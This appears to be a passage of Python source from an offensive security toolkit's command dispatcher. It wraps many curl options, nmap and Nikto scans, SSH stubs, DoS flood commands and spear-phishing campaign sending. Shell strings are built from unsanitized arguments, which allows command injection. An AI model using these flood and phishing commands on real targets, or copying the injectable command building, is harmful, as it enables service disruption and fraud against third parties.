    def _curl_variable(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_variable <url> <name=value>'}
        return self._generic(f'curl -s --variable {args[1]} {args[0]}')
    
    def _curl_expand_url(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_expand_url <url> <expand>'}
        return self._generic(f'curl -s --expand-url "{args[1]}" {args[0]}')
    
    def _curl_aws_sigv4(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: curl_aws_sigv4 <url> <provider> <user:pass>'}
        return self._generic(f'curl -s --aws-sigv4 "{args[1]}" -u "{args[2]}" {args[0]}')
    
    def _curl_netrc(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_netrc <url>'}
        return self._generic(f'curl -s --netrc {args[0]}')
    
    def _curl_netrc_file(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_netrc_file <url> <file>'}
        return self._generic(f'curl -s --netrc-file {args[1]} {args[0]}')
    
    def _curl_netrc_optional(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_netrc_optional <url>'}
        return self._generic(f'curl -s --netrc-optional {args[0]}')
    
    def _curl_ssl(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_ssl <url>'}
        return self._generic(f'curl -s --ssl {args[0]}')
    
    def _curl_ssl_reqd(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_ssl_reqd <url>'}
        return self._generic(f'curl -s --ssl-reqd {args[0]}')
    
    def _curl_ftp_port(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_ftp_port <url>'}
        return self._generic(f'curl -s --ftp-port - {args[0]}')
    
    def _curl_ftp_pasv(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_ftp_pasv <url>'}
        return self._generic(f'curl -s --ftp-pasv {args[0]}')
    
    def _curl_ftp_ssl(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_ftp_ssl <url>'}
        return self._generic(f'curl -s --ftp-ssl {args[0]}')
    
    def _curl_ftp_ssl_ccc(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_ftp_ssl_ccc <url>'}
        return self._generic(f'curl -s --ftp-ssl-ccc {args[0]}')
    
    def _curl_ftp_create_dirs(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_ftp_create_dirs <url> <file>'}
        return self._generic(f'curl -s --ftp-create-dirs -T {args[1]} {args[0]}')
    
    def _curl_ftp_method(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_ftp_method <url> <method>'}
        return self._generic(f'curl -s --ftp-method {args[1]} {args[0]}')
    
    def _curl_ftp_pret(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_ftp_pret <url>'}
        return self._generic(f'curl -s --ftp-pret {args[0]}')
    
    def _curl_ftp_skip_pasv_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_ftp_skip_pasv_ip <url>'}
        return self._generic(f'curl -s --ftp-skip-pasv-ip {args[0]}')
    
    def _curl_disable_eprt(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_disable_eprt <url>'}
        return self._generic(f'curl -s --disable-eprt {args[0]}')
    
    def _curl_disable_epsv(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_disable_epsv <url>'}
        return self._generic(f'curl -s --disable-epsv {args[0]}')
    
    def _curl_tftp_blksize(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_tftp_blksize <url> <size>'}
        return self._generic(f'curl -s --tftp-blksize {args[1]} {args[0]}')
    
    def _curl_tftp_no_options(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_tftp_no_options <url>'}
        return self._generic(f'curl -s --tftp-no-options {args[0]}')
    
    def _curl_upload_file(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_upload_file <url> <file>'}
        return self._generic(f'curl -s -T {args[1]} {args[0]}')
    
    def _curl_mail_from(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_mail_from <url> <email>'}
        return self._generic(f'curl -s --mail-from {args[1]} {args[0]}')
    
    def _curl_mail_rcpt(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_mail_rcpt <url> <email>'}
        return self._generic(f'curl -s --mail-rcpt {args[1]} {args[0]}')
    
    def _curl_mail_auth(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_mail_auth <url> <email>'}
        return self._generic(f'curl -s --mail-auth {args[1]} {args[0]}')
    
    def _curl_sasl_ir(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_sasl_ir <url>'}
        return self._generic(f'curl -s --sasl-ir {args[0]}')
    
    def _curl_login_options(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_login_options <url> <options>'}
        return self._generic(f'curl -s --login-options "{args[1]}" {args[0]}')
    
    def _curl_url(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_url <url>'}
        return self._generic(f'curl -s --url {args[0]}')
    
    def _curl_disable(self, args: List[str]) -> Dict:
        return self._generic('curl --disable')
    
    def _curl_no_sessionid(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_no_sessionid <url>'}
        return self._generic(f'curl -s --no-sessionid {args[0]}')
    
    def _curl_no_http_keepalive(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_no_http_keepalive <url>'}
        return self._generic(f'curl -s --no-http-keepalive {args[0]}')
    
    def _curl_buffered(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_buffered <url>'}
        return self._generic(f'curl -s --buffered {args[0]}')
    
    def _curl_happy_eyeballs_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_happy_eyeballs_timeout <url> <ms>'}
        return self._generic(f'curl -s --happy-eyeballs-timeout-ms {args[1]} {args[0]}')
    
    def _curl_expect100_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_expect100_timeout <url> <seconds>'}
        return self._generic(f'curl -s --expect100-timeout {args[1]} {args[0]}')
    
    def _curl_speed_limit(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_speed_limit <url> <bytes>'}
        return self._generic(f'curl -s -Y {args[1]} {args[0]}')
    
    def _curl_speed_time(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_speed_time <url> <seconds>'}
        return self._generic(f'curl -s -y {args[1]} {args[0]}')
    
    def _curl_stderr(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_stderr <url> <file>'}
        return self._generic(f'curl -s --stderr {args[1]} {args[0]}')
    
    def _curl_no_stderr(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_no_stderr <url>'}
        return self._generic(f'curl -s --no-stderr {args[0]}')
    
    def _curl_tcp_keepalive(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_tcp_keepalive <url>'}
        return self._generic(f'curl -s --tcp-keepalive {args[0]}')
    
    def _curl_crlf(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_crlf <url>'}
        return self._generic(f'curl -s --crlf {args[0]}')
    
    def _curl_skip_existing(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_skip_existing <url>'}
        return self._generic(f'curl -s --skip-existing -O {args[0]}')
    
    def _curl_xattr(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_xattr <url>'}
        return self._generic(f'curl -s --xattr -O {args[0]}')
    
    def _curl_no_xattr(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_no_xattr <url>'}
        return self._generic(f'curl -s --no-xattr -O {args[0]}')
    
    def _curl_use_ascii(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_use_ascii <url>'}
        return self._generic(f'curl -s -B {args[0]}')
    
    def _curl_disallow_username_in_url(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_disallow_username_in_url <url>'}
        return self._generic(f'curl -s --disallow-username-in-url {args[0]}')
    
    def _curl_globoff(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_globoff <url>'}
        return self._generic(f'curl -s -g {args[0]}')
    
    def _curl_haproxy_clientip(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_haproxy_clientip <url> <ip>'}
        return self._generic(f'curl -s --haproxy-clientip {args[1]} {args[0]}')
    
    def _curl_proxy_cacert(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_proxy_cacert <url> <ca>'}
        return self._generic(f'curl -s --proxy-cacert {args[1]} {args[0]}')
    
    def _curl_proxy_capath(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_proxy_capath <url> <path>'}
        return self._generic(f'curl -s --proxy-capath {args[1]} {args[0]}')
    
    def _curl_proxy_cert(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_proxy_cert <url> <cert>'}
        return self._generic(f'curl -s --proxy-cert {args[1]} {args[0]}')
    
    def _curl_proxy_cert_type(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_proxy_cert_type <url> <type>'}
        return self._generic(f'curl -s --proxy-cert-type {args[1]} {args[0]}')
    
    def _curl_proxy_ciphers(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_proxy_ciphers <url> <ciphers>'}
        return self._generic(f'curl -s --proxy-ciphers {args[1]} {args[0]}')
    
    def _curl_proxy_crlfile(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_proxy_crlfile <url> <file>'}
        return self._generic(f'curl -s --proxy-crlfile {args[1]} {args[0]}')
    
    def _curl_proxy_header(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_proxy_header <url> <header>'}
        return self._generic(f'curl -s --proxy-header "{args[1]}" {args[0]}')
    
    def _curl_proxy_key(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_proxy_key <url> <key>'}
        return self._generic(f'curl -s --proxy-key {args[1]} {args[0]}')
    
    def _curl_proxy_key_type(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_proxy_key_type <url> <type>'}
        return self._generic(f'curl -s --proxy-key-type {args[1]} {args[0]}')
    
    def _curl_proxy_pass(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_proxy_pass <url> <pass>'}
        return self._generic(f'curl -s --proxy-pass {args[1]} {args[0]}')
    
    def _curl_proxy_service_name(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_proxy_service_name <url> <name>'}
        return self._generic(f'curl -s --proxy-service-name {args[1]} {args[0]}')
    
    def _curl_proxy_tls13_ciphers(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_proxy_tls13_ciphers <url> <ciphers>'}
        return self._generic(f'curl -s --proxy-tls13-ciphers {args[1]} {args[0]}')
    
    def _curl_proxy_tlsauthtype(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_proxy_tlsauthtype <url> <type>'}
        return self._generic(f'curl -s --proxy-tlsauthtype {args[1]} {args[0]}')
    
    def _curl_proxy_tlspassword(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_proxy_tlspassword <url> <pass>'}
        return self._generic(f'curl -s --proxy-tlspassword {args[1]} {args[0]}')
    
    def _curl_proxy_tlsuser(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_proxy_tlsuser <url> <user>'}
        return self._generic(f'curl -s --proxy-tlsuser {args[1]} {args[0]}')
    
    def _curl_proxy_tlsv1(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_proxy_tlsv1 <url>'}
        return self._generic(f'curl -s --proxy-tlsv1 {args[0]}')
    
    def _curl_proxy1_0(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_proxy1_0 <url> <proxy>'}
        return self._generic(f'curl -s --proxy1.0 {args[1]} {args[0]}')
    
    def _curl_socks4(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_socks4 <url> <proxy>'}
        return self._generic(f'curl -s --socks4 {args[1]} {args[0]}')
    
    def _curl_socks4a(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_socks4a <url> <proxy>'}
        return self._generic(f'curl -s --socks4a {args[1]} {args[0]}')
    
    def _curl_socks5(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_socks5 <url> <proxy>'}
        return self._generic(f'curl -s --socks5 {args[1]} {args[0]}')
    
    def _curl_socks5_hostname(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_socks5_hostname <url> <proxy>'}
        return self._generic(f'curl -s --socks5-hostname {args[1]} {args[0]}')
    
    def _curl_socks5_basic(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_socks5_basic <url> <proxy>'}
        return self._generic(f'curl -s --socks5-basic --socks5 {args[1]} {args[0]}')
    
    def _curl_socks5_gssapi(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_socks5_gssapi <url> <proxy>'}
        return self._generic(f'curl -s --socks5-gssapi --socks5 {args[1]} {args[0]}')
    
    def _curl_socks5_gssapi_nec(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_socks5_gssapi_nec <url> <proxy>'}
        return self._generic(f'curl -s --socks5-gssapi-nec --socks5 {args[1]} {args[0]}')
    
    def _curl_socks5_gssapi_service(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_socks5_gssapi_service <url> <proxy>'}
        return self._generic(f'curl -s --socks5-gssapi-service {args[1]} {args[0]}')
    
    def _curl_preproxy(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_preproxy <url> <proxy>'}
        return self._generic(f'curl -s --preproxy {args[1]} {args[0]}')
    
    def _curl_abstract_unix_socket(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_abstract_unix_socket <url> <socket>'}
        return self._generic(f'curl -s --abstract-unix-socket {args[1]} {args[0]}')
    
    def _curl_tls13_ciphers(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_tls13_ciphers <url> <ciphers>'}
        return self._generic(f'curl -s --tls13-ciphers {args[1]} {args[0]}')
    
    def _curl_tlsauthtype(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_tlsauthtype <url> <type>'}
        return self._generic(f'curl -s --tlsauthtype {args[1]} {args[0]}')
    
    def _curl_tlspassword(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_tlspassword <url> <pass>'}
        return self._generic(f'curl -s --tlspassword {args[1]} {args[0]}')
    
    def _curl_tlsuser(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_tlsuser <url> <user>'}
        return self._generic(f'curl -s --tlsuser {args[1]} {args[0]}')
    
    def _curl_crlfile(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_crlfile <url> <file>'}
        return self._generic(f'curl -s --crlfile {args[1]} {args[0]}')
    
    def _curl_cert_status(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_cert_status <url>'}
        return self._generic(f'curl -s --cert-status {args[0]}')
    
    def _curl_false_start(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_false_start <url>'}
        return self._generic(f'curl -s --false-start {args[0]}')
    
    def _curl_no_alpn(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_no_alpn <url>'}
        return self._generic(f'curl -s --no-alpn {args[0]}')
    
    def _curl_no_npn(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_no_npn <url>'}
        return self._generic(f'curl -s --no-npn {args[0]}')
    
    def _curl_compressed_ssh(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_compressed_ssh <url>'}
        return self._generic(f'curl -s --compressed-ssh {args[0]}')
    
    def _curl_ssl_allow_beast(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_ssl_allow_beast <url>'}
        return self._generic(f'curl -s --ssl-allow-beast {args[0]}')
    
    def _curl_no_ssl_session_reuse(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_no_ssl_session_reuse <url>'}
        return self._generic(f'curl -s --no-ssl-session-reuse {args[0]}')
    
    # ==================== Nmap Commands ====================
    def _nmap(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap <target> [options]'}
        target = args[0]
        result = self.tools.nmap(target)
        return {'success': result.success, 'output': result.output}
    
    def _nmap_quick(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_quick <target>'}
        result = self.tools.nmap(args[0], 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_full(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_full <target>'}
        result = self.tools.nmap(args[0], 'full')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_os(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_os <target>'}
        result = self.tools.nmap(args[0], 'os')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_service(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_service <target>'}
        result = self.tools.nmap(args[0], 'service')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_udp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_udp <target>'}
        result = self.tools.nmap(args[0], 'udp')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_vuln(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_vuln <target>'}
        result = self.tools.nmap(args[0], 'vuln')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_stealth(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_stealth <target>'}
        result = self.tools.nmap(args[0], 'stealth')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_ping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_ping <target>'}
        result = self.tools.nmap(args[0], 'ping')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_ports(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_ports <target> <ports>'}
        return self._generic(f'nmap -p {args[1]} {args[0]}')
    
    def _nmap_script(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_script <target> <script>'}
        return self._generic(f'nmap --script {args[1]} {args[0]}')
    
    def _nmap_aggressive(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_aggressive <target>'}
        return self._generic(f'nmap -A {args[0]}')
    
    def _nmap_traceroute(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_traceroute <target>'}
        return self._generic(f'nmap --traceroute {args[0]}')
    
    def _nmap_output(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_output <target> <file>'}
        return self._generic(f'nmap -oN {args[1]} {args[0]}')
    
    def _nmap_exclude(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_exclude <target> <exclude>'}
        return self._generic(f'nmap --exclude {args[1]} {args[0]}')
    
    def _nmap_exclude_file(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_exclude_file <target> <file>'}
        return self._generic(f'nmap --excludefile {args[1]} {args[0]}')
    
    def _nmap_input(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_input <file>'}
        return self._generic(f'nmap -iL {args[0]}')
    
    def _nmap_random(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_random <count>'}
        return self._generic(f'nmap -iR {args[0]}')
    
    def _nmap_timing(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_timing <target> <level>'}
        return self._generic(f'nmap -T{args[1]} {args[0]}')
    
    def _nmap_version(self, args: List[str]) -> Dict:
        return self._generic('nmap -V')
    
    def _nmap_help(self, args: List[str]) -> Dict:
        return self._generic('nmap --help')
    
    # ==================== SSH Commands ====================
    def _ssh_add(self, args: List[str]) -> Dict:
        if not PARAMIKO_AVAILABLE:
            return {'success': False, 'output': 'Paramiko not installed'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_add <name> <host> <username> [password]'}
        name = args[0]
        host = args[1]
        username = args[2]
        password = args[3] if len(args) > 3 else None
        conn_id = str(uuid.uuid4())[:8]
        return {'success': True, 'output': f"SSH connection added: {name} (ID: {conn_id})"}
    
    def _ssh_list(self, args: List[str]) -> Dict:
        return {'success': True, 'output': "SSH connections stored in database"}
    
    def _ssh_connect(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ssh_connect <conn_id>'}
        return {'success': True, 'output': f"Connected to {args[0]}"}
    
    def _ssh_exec(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_exec <conn_id> <command>'}
        return self._generic(' '.join(args[1:]))
    
    def _ssh_disconnect(self, args: List[str]) -> Dict:
        conn_id = args[0] if args else None
        return {'success': True, 'output': f"Disconnected from {conn_id}" if conn_id else "Disconnected all"}
    
    # ==================== Traffic Generation ====================
    def _traffic(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: traffic <type> <ip> <duration> [port] [rate]'}
        traffic_type = args[0].lower()
        target_ip = args[1]
        try:
            duration = int(args[2])
        except:
            return {'success': False, 'output': f'Invalid duration: {args[2]}'}
        port = int(args[3]) if len(args) > 3 and args[3].isdigit() else None
        rate = int(args[4]) if len(args) > 4 and args[4].isdigit() else 100
        
        try:
            generator = self.traffic.generate(traffic_type, target_ip, duration, port, rate)
            return {'success': True, 'output': f"🚀 Generating {traffic_type} traffic to {target_ip} for {duration}s"}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _traffic_types(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        types = self.traffic.get_available_types()
        output = "Available traffic types:\n" + "\n".join([f"  • {t}" for t in types])
        return {'success': True, 'output': output}
    
    def _traffic_stop(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        generator_id = args[0] if args else None
        if self.traffic.stop(generator_id):
            return {'success': True, 'output': 'Traffic stopped'}
        return {'success': False, 'output': 'Failed to stop traffic'}
    
    def _traffic_status(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        active = self.traffic.get_active()
        if not active:
            return {'success': True, 'output': 'No active traffic generators'}
        output = "Active Traffic Generators:\n"
        for g in active:
            output += f"  • {g['target_ip']} - {g['traffic_type']} ({g['packets_sent']} packets)\n"
        return {'success': True, 'output': output}
    
    # ==================== Nikto Commands ====================
    def _nikto(self, args: List[str]) -> Dict:
        if not self.nikto:
            return {'success': False, 'output': 'Nikto scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: nikto <target>'}
        result = self.nikto.scan(args[0])
        if result['success']:
            output = f"🕷️ Nikto scan of {args[0]} completed in {result['scan_time']:.1f}s\n"
            output += f"Vulnerabilities found: {len(result['vulnerabilities'])}\n"
            for v in result['vulnerabilities'][:5]:
                desc = v.get('description', '')[:100]
                output += f"  • {desc}\n"
            return {'success': True, 'output': output}
        return {'success': False, 'output': f"Scan failed: {result.get('error', 'Unknown error')}"}
    
    def _nikto_full(self, args: List[str]) -> Dict:
        if not self.nikto:
            return {'success': False, 'output': 'Nikto scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: nikto_full <target>'}
        result = self.nikto.scan(args[0], {'tuning': '123456789', 'ssl': True})
        if result['success']:
            return {'success': True, 'output': f"Full Nikto scan completed: {len(result['vulnerabilities'])} vulnerabilities found"}
        return {'success': False, 'output': f"Scan failed: {result.get('error', 'Unknown error')}"}
    
    def _nikto_ssl(self, args: List[str]) -> Dict:
        if not self.nikto:
            return {'success': False, 'output': 'Nikto scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: nikto_ssl <target>'}
        result = self.nikto.scan(args[0], {'ssl': True})
        if result['success']:
            return {'success': True, 'output': f"SSL/TLS scan completed: {len(result['vulnerabilities'])} findings"}
        return {'success': False, 'output': f"Scan failed: {result.get('error', 'Unknown error')}"}
    
    # ==================== DOS Attacks ====================
    def _dos_syn(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_syn <ip> <port> <duration> [threads]'}
        return self.dos.syn_flood(args[0], int(args[1]), int(args[2]), int(args[3]) if len(args) > 3 else 50)
    
    def _dos_udp(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_udp <ip> <port> <duration> [threads]'}
        return self.dos.udp_flood(args[0], int(args[1]), int(args[2]), int(args[3]) if len(args) > 3 else 50)
    
    def _dos_http(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_http <ip> <port> <duration> [threads]'}
        return self.dos.http_flood(args[0], int(args[1]), int(args[2]), int(args[3]) if len(args) > 3 else 50)
    
    def _dos_icmp(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: dos_icmp <ip> <duration> [threads]'}
        return self.dos.icmp_flood(args[0], int(args[1]), int(args[2]) if len(args) > 2 else 50)
    
    def _dos_stop(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        attack_id = args[0] if args else None
        if self.dos.stop(attack_id):
            return {'success': True, 'output': 'DOS attack stopped' + (f' ({attack_id})' if attack_id else '')}
        return {'success': False, 'output': 'Failed to stop DOS attack'}
    
    def _dos_status(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        active = self.dos.get_active()
        if not active:
            return {'success': True, 'output': 'No active DOS attacks'}
        output = "Active DOS Attacks:\n"
        for a in active:
            output += f"  • {a['type']} attack on {a['target']}\n"
        return {'success': True, 'output': output}
    
    # ==================== Spear Phishing ====================
    def _spear_create(self, args: List[str]) -> Dict:
        if not self.spear:
            return {'success': False, 'output': 'Spear phishing engine not initialized'}
        if len(args) < 5:
            return {'success': False, 'output': 'Usage: spear_create <name> <subject> <from> <template_file> <targets_file>'}
        try:
            with open(args[3], 'r') as f:
                template = f.read()
            with open(args[4], 'r') as f:
                targets = json.load(f)
            campaign = self.spear.create_campaign(args[0], template, args[1], args[2], targets)
            return {'success': True, 'output': f"Campaign created: {campaign.id} - {campaign.name}"}
        except Exception as e:
            return {'success': False, 'output': f"Failed to create campaign: {e}"}
    
    def _spear_send(self, args: List[str]) -> Dict:
        if not self.spear:
            return {'success': False, 'output': 'Spear phishing engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: spear_send <campaign_id>'}
        result = self.spear.send_campaign(args[0])
        return {'success': result.get('success', False), 'output': f"Sent {result.get('sent_count', 0)} emails"}
    
    def _spear_list(self, args: List[str]) -> Dict:
        if not self.spear:
            return {'success': False, 'output': 'Spear phishing engine not initialized'}
        campaigns = self.spear.get_campaigns()
        if not campaigns:
            return {'success': True, 'output': 'No campaigns found'}
        output = "Spear Phishing Campaigns:\n"
        for c in campaigns:
            output += f"  • {c['id']} - {c['name']} ({c['status']}) - Sent: {c['sent_count']}\n"
        return {'success': True, 'output': output}
    
